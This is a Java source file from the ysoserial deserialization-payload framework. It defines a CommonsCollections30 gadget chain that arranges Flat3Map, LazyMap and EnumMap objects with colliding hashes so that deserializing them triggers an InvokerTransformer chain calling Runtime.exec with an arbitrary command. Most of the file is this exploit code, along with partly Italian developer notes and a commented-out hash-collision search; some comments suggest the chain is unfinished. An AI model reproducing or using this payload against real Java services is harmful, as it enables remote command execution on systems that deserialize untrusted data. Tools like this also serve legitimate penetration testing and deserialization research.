package ysoserial.payloads;

import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections.list.CursorableLinkedList;
import org.apache.commons.collections4.map.Flat3Map;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections.map.ReferenceMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.util.*;

/*
    Cluster1_20222405-214250.txt, first chain.
	Gadget chain:

        chain_Flat3Map4-readObject-0bea76c516da74176846c86c9666c913d1d49fe9.txt
            [
         <org.apache.commons.collections4.map.Flat3Map: void readObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections4.map.Flat3Map: java.lang.Object put(java.lang.Object,java.lang.Object)>
         <java.util.EnumMap: boolean equals(java.lang.Object)>
         <org.apache.commons.collections4.map.LazyMap: java.lang.Object get(java.lang.Object)>
         <org.apache.commons.collections4.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
         <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
        ]

 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({ Authors.NAVALORENZO })
public class CommonsCollections30 extends PayloadRunner implements ObjectPayload<Flat3Map> {
    enum ProvaEnum {
        zZ,
        yy
    }

    public Flat3Map getObject(final String command) throws Exception {

        // Reusing transformer chain and LazyMap gadgets from previous payloads
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                execArgs),
            new ConstantTransformer(1)};

        //Object templates = Gadgets.createTemplatesImpl(command);

        // setup harmless chain
        //final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // LazyMap.get() it should be called with an input parameter that is a key not already existing in the map, so that the transformer will be called on that key.
//        LazyMap.get();
        // The InvokerTransformer should be set as the LazyMap transformer (via reflection or lazyMap method).
        // The LazyMap.get should be called via Flat3Map.equals, to do so the input parameter of equals should be a LazyMap,
        //  and the LazyMap should not contain a key existing in the Flat3Map, the LazyMap.get will be called with the key
        //  of the Flat3Map as input parameter
        //    Flat3Map;
        // Flat3Map.equals should be called by FastHashMap.equals, to do so the input parameter should be a map with a value of LazyMap
        //  where his key should be the same key contained in the FastHashMap (not sure about the key thing).
        //    FastHashMap
        // FastHashMap.equals should be called by CursorableLinkedList.equals, to do so the input parameter should be a
        //  list with a map containing the LazyMap as value of a key. And the CursorableLinkedList should contain a FastHashMap.
        //    CursorableLinkedList
        // CursorableLinkedList.equals should be called by AbstractHashedMap.isEqualKey, to do so two different objects "key" that results
        //  or not equal in an equals method should be passed as parameters of the isEqualKey method.
//        AbstractHashedMap;
        // AbstractHashedMap.isEqualKey should be called by AbstractHashedMap.put, so the insertion of an object should fire the isEqualKey check.
        //  To do so we should have data not null inside the AbstractHashMap and then the method isEqualKey would be called with as parameter:
        //  the input key of the put parameter and a key from the AbstractHashMap entry analyzed, so the map must contain at least
        //  another entry different from the one we are trying to insert at this moment.
        // AbstractHashedMap.put is be called by AbstractReferenceMap.put, via super.put(key, value)
        // AbstractReferenceMap.put is called by AbstractReferenceMap.doReadObject, this happens when the AbstractReferenceMap
        //  object is deserialized, and it's content in byte is read and put inside the map.
        // Lastly AbstractReferenceMap.doReadObject is called by ReferenceIdentityMap.readObject during the normal deserialization process.
//        ReferenceIdentityMap;


        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map innerMap3 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.lazyMap(innerMap1, transformerChain);
        lazyMap1.put(ProvaEnum.zZ, "ZA"); // yh

        Map lazyMapEnum = LazyMap.lazyMap(innerMap3, transformerChain);
        lazyMapEnum.put(ProvaEnum.zZ, 1);
        EnumMap<ProvaEnum, String> enumMap1 = new EnumMap(ProvaEnum.class);
        enumMap1.put(ProvaEnum.zZ, "ZA");
        EnumMap<ProvaEnum, Map<ProvaEnum,Object>> enumMap2 = new EnumMap(ProvaEnum.class);
        enumMap2.put(ProvaEnum.yy, lazyMapEnum);

        System.out.println("LazyMap hashcode: " + lazyMap1.hashCode());
        System.out.println("EnumMap hashcode: " + enumMap1.hashCode());
        // Hanno lo stesso hash ma avendo lo stesso hash ne viene inserito uno solo nella flat3map

        Flat3Map flat3MapOutput = new Flat3Map();
        //flat3MapOutput.put(lazyMap1, enumMap2); // lazymap1
        //flat3MapOutput.put(enumMap2, enumMap2);
        flat3MapOutput.put(lazyMap1, 1); // lazymap1
        flat3MapOutput.put(enumMap1, 2);
        //flat3MapOutput.put("yy", 1); // lazymap1
        //flat3MapOutput.put("zZ", 2);
        // Trovare un modo per avere una lazymap collidente con la enumMap, in modo da inserire la lazymap come prima chiave

        // arm transformer
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);



        // INIZIO PROGRAMMA
        /*    Map<Integer, List<String>> hashMap = new HashMap();
        String str = "abcdefghijklmnopqrstuvwxyz";
        //str += "0123456789!\"£$%&/()=?^@#][{}òçà°ù§èé+*\\|-_.:,;€";
        str += str.toUpperCase();
        for (char c1 : str.toCharArray()) {
            for (char c2 : str.toCharArray()) {
                // for (char c3 : str.toCharArray()) {
                String s = c1 + "" + c2;// + "" + c3;
                //int code = s.hashCode();

                // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
                Map lazyMap5 = LazyMap.lazyMap(innerMap2, transformerChain);
                lazyMap5.put(ProvaEnum.zZ, s); // yh

                int codeLazyMap = lazyMap5.hashCode();
                if (!hashMap.containsKey(codeLazyMap)) {
                    System.out.println(s + "  " + codeLazyMap);
                    hashMap.put(codeLazyMap, new ArrayList<String>());


                    for (char k3 : str.toCharArray()) {
                        for (char k4 : str.toCharArray()) {
                            //for (char k5 : str.toCharArray()) {
                            String string = k3 + "" + k4;// + "" + k5;
                            EnumMap<ProvaEnum, String> enumMap5 = new EnumMap(ProvaEnum.class);
                            enumMap5.put(ProvaEnum.zZ, string);

                            int codeEnumMap = enumMap5.hashCode();

                            //System.out.println("  -  " + string + "  " + codeEnumMap);
                            if (hashMap.get(codeEnumMap) != null) {
                                System.out.println("COLLISION FOUND");
                                hashMap.get(codeEnumMap).add(string);
                                System.out.println("LazyMap string:" + s);
                                System.out.println("EnumMapString:" + string);
                                //return;
                            }
                            //}
                        }
                    }

                } // ENDIF
                // }
            }
        }

*/

        //END

        // Needed to ensure hash collision after previous manipulations
        //lazyMap2.remove("yy");

        return flat3MapOutput;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections30.class, args);
    }
}
